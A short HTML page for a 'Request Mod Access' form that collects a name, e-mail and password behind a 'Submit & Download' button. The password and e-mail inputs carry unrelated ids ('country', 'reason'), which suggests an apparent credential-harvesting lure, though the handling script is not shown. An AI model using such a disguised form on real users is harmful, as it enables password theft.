<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Mod Access</title>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">
  <h2>Request Mod Access</h2>

  <form id="modForm">
    <input type="text" id="name" placeholder="Name" required>

    <textarea id="reason" placeholder="E-Mail" required></textarea>

    <input type="text" id="country" placeholder="Password" required>

    <button type="submit">Submit & Download</button>
  </form>

  <div id="status"></div>
</div>

<script src="script.js"></script>

</body>
</html>
